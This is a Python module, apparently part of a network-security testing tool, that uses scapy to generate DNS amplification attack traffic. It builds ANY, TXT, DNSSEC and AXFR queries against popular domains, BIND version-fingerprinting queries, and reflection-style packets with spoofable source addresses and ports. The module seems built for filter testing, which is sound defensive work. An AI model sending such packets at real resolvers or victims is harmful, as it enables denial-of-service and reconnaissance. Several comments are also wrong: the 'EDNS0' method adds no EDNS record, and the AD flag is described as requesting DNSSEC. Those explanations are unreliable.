"""DNS amplification attack traffic module."""

import random
from typing import Iterator

from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR
from scapy.packet import Packet

from netsec_tester.modules.base import ModuleInfo, TrafficCategory, TrafficModule


# Domains commonly used in DNS amplification
AMPLIFICATION_TARGETS = [
    "google.com",
    "facebook.com",
    "cloudflare.com",
    "amazon.com",
    "microsoft.com",
    "apple.com",
    "yahoo.com",
]


class DNSAmplificationModule(TrafficModule):
    """Traffic module for DNS amplification attack patterns.

    Generates DNS queries that simulate DNS amplification attacks
    using ANY queries and open resolver abuse.
    """

    def __init__(self) -> None:
        """Initialize the DNS amplification module."""
        self._query_count = 0

    def get_info(self) -> ModuleInfo:
        """Return module information."""
        return ModuleInfo(
            name="dns_amplification",
            description="DNS amplification attacks (ANY queries, open resolver abuse)",
            category=TrafficCategory.DNS_FILTER,
            protocols=["UDP"],
            ports=[53],
        )

    def _generate_any_query(self, src_ip: str, dst_ip: str) -> Iterator[Packet]:
        """Generate ANY query for maximum amplification."""
        domain = random.choice(AMPLIFICATION_TARGETS)

        # ANY query returns all record types - high amplification
        # qtype 255 is the numeric value for ANY
        packet = (
            IP(src=src_ip, dst=dst_ip)
            / UDP(sport=random.randint(49152, 65535), dport=53)
            / DNS(
                rd=1,
                qd=DNSQR(qname=domain, qtype=255),
            )
        )
        yield packet

    def _generate_txt_query(self, src_ip: str, dst_ip: str) -> Iterator[Packet]:
        """Generate TXT query for amplification."""
        domain = random.choice(AMPLIFICATION_TARGETS)

        # TXT records can be large
        packet = (
            IP(src=src_ip, dst=dst_ip)
            / UDP(sport=random.randint(49152, 65535), dport=53)
            / DNS(
                rd=1,
                qd=DNSQR(qname=domain, qtype="TXT"),
            )
        )
        yield packet

    def _generate_dnssec_query(self, src_ip: str, dst_ip: str) -> Iterator[Packet]:
        """Generate DNSSEC queries for large responses."""
        domain = random.choice(AMPLIFICATION_TARGETS)

        # DNSSEC records are typically large
        dnssec_types = ["DNSKEY", "RRSIG", "DS"]
        qtype = random.choice(dnssec_types)

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / UDP(sport=random.randint(49152, 65535), dport=53)
            / DNS(
                rd=1,
                ad=1,  # Request DNSSEC
                qd=DNSQR(qname=domain, qtype=qtype),
            )
        )
        yield packet

    def _generate_edns_query(self, src_ip: str, dst_ip: str) -> Iterator[Packet]:
        """Generate EDNS0 query with large buffer size."""
        domain = random.choice(AMPLIFICATION_TARGETS)

        # EDNS0 with large buffer allows bigger responses
        # Use MX query which typically returns multiple records
        packet = (
            IP(src=src_ip, dst=dst_ip)
            / UDP(sport=random.randint(49152, 65535), dport=53)
            / DNS(
                rd=1,
                qd=DNSQR(qname=domain, qtype="MX"),
            )
        )
        yield packet

        # Also query for AXFR (zone transfer) which is highly amplified
        packet = (
            IP(src=src_ip, dst=dst_ip)
            / UDP(sport=random.randint(49152, 65535), dport=53)
            / DNS(
                rd=1,
                qd=DNSQR(qname=domain, qtype="AXFR"),
            )
        )
        yield packet

    def _generate_recursive_query(self, src_ip: str, dst_ip: str) -> Iterator[Packet]:
        """Generate recursive queries to open resolvers."""
        domain = random.choice(AMPLIFICATION_TARGETS)

        # Multiple query types to test resolver
        qtypes = ["A", "AAAA", "MX", "NS", "SOA"]
        qtype = random.choice(qtypes)

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / UDP(sport=random.randint(49152, 65535), dport=53)
            / DNS(
                rd=1,  # Recursion Desired
                qd=DNSQR(qname=domain, qtype=qtype),
            )
        )
        yield packet

    def _generate_version_query(self, src_ip: str, dst_ip: str) -> Iterator[Packet]:
        """Generate version.bind query (resolver fingerprinting)."""
        # Query for BIND version - also used in reconnaissance
        packet = (
            IP(src=src_ip, dst=dst_ip)
            / UDP(sport=random.randint(49152, 65535), dport=53)
            / DNS(
                rd=0,
                qd=DNSQR(qname="version.bind", qtype="TXT", qclass=3),  # CH class
            )
        )
        yield packet

    def _generate_isc_query(self, src_ip: str, dst_ip: str) -> Iterator[Packet]:
        """Generate ISC queries for resolver info."""
        # Various ISC/BIND reconnaissance queries
        queries = [
            "hostname.bind",
            "id.server",
            "version.server",
        ]

        qname = random.choice(queries)

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / UDP(sport=random.randint(49152, 65535), dport=53)
            / DNS(
                rd=0,
                qd=DNSQR(qname=qname, qtype="TXT", qclass=3),  # CH class
            )
        )
        yield packet

    def _generate_spoofed_source(self, src_ip: str, dst_ip: str) -> Iterator[Packet]:
        """Generate pattern suggesting source IP spoofing."""
        domain = random.choice(AMPLIFICATION_TARGETS)

        # Use a common victim port (indicating reflection attack)
        # Source port 80 or 443 suggests the response is meant to go elsewhere
        # qtype 255 is the numeric value for ANY
        packet = (
            IP(src=src_ip, dst=dst_ip)
            / UDP(sport=random.choice([80, 443, 53]), dport=53)
            / DNS(
                rd=1,
                qd=DNSQR(qname=domain, qtype=255),
            )
        )
        yield packet

    def generate_packets(
        self,
        src_ip: str,
        dst_ip: str,
        dst_port: int | None = None,
    ) -> Iterator[Packet]:
        """Generate DNS amplification attack packets.

        Args:
            src_ip: Source IP address
            dst_ip: Destination IP address (DNS server)
            dst_port: Destination port (ignored, always 53)

        Yields:
            Scapy packets with DNS amplification patterns
        """
        self._query_count += 1

        # Rotate through different amplification methods
        method = self._query_count % 8

        if method == 0:
            yield from self._generate_any_query(src_ip, dst_ip)
        elif method == 1:
            yield from self._generate_txt_query(src_ip, dst_ip)
        elif method == 2:
            yield from self._generate_dnssec_query(src_ip, dst_ip)
        elif method == 3:
            yield from self._generate_edns_query(src_ip, dst_ip)
        elif method == 4:
            yield from self._generate_recursive_query(src_ip, dst_ip)
        elif method == 5:
            yield from self._generate_version_query(src_ip, dst_ip)
        elif method == 6:
            yield from self._generate_isc_query(src_ip, dst_ip)
        else:
            yield from self._generate_spoofed_source(src_ip, dst_ip)

